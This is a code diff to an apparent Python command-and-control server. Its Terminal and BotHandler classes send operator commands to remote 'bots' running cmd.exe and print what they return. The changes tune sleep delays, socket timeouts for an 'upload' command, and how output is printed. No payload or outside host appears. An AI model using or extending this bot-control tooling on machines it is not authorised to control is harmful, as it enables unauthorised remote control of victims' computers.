@@ -220,7 +220,7 @@ class Terminal(Cmd):
             pass
         else:
             self.q.put("\n")
-            time.sleep(1.2) # To not input prompt before response
+            time.sleep(1.4) # To not input prompt before response
     
     def default(self, args):
         if self.q == None:
@@ -228,7 +228,7 @@ class Terminal(Cmd):
             self.help_interact()
         else:
             self.q.put(args+"\n")
-            time.sleep(1.2) # To not input prompt before response
+            time.sleep(1.4) # To not input prompt before response
 
 
 
@@ -303,18 +303,15 @@ class BotHandler(threading.Thread):
                 cmd_response = ""
                 while True:
                     try:
-                        # Separate parsing for long commands...
-                        #longcommands = ["ping"]
-                        #if any(RecvBotCmd in s for s in longcommands):
-                        #    self.client.settimeout(5)
-            
                         # Client returns entered command (because cmd.exe has it in input)
                         # So 
                         # if response is only as large as input - command not completed yet
                         #   .. wait longer timeout for command execution ..
                         # else - some output already is received
                         #   .. do not wait more if there's no data in socket.
-                        if (len(cmd_response) <= len(RecvBotCmd)):
+                        if "upload" in RecvBotCmd:
+                            self.client.settimeout(5)
+                        elif (len(cmd_response) <= len(RecvBotCmd)):
                             self.client.settimeout(5)
                         else:
                             self.client.settimeout(1)
@@ -331,8 +328,10 @@ class BotHandler(threading.Thread):
                     else:
                         cmd_response += recv
                 
+                #print("Len response {}".format(len(cmd_response)))
                 # Removing sent command from response before printing output
-                print(cmd_response.replace(RecvBotCmd,""))
+                if len(cmd_response.strip()) > 1:
+                    print(cmd_response.replace(RecvBotCmd,""))
             
             except Exception as ex:
                 print("[-] Exception occured while sending command: {}".format(ex))
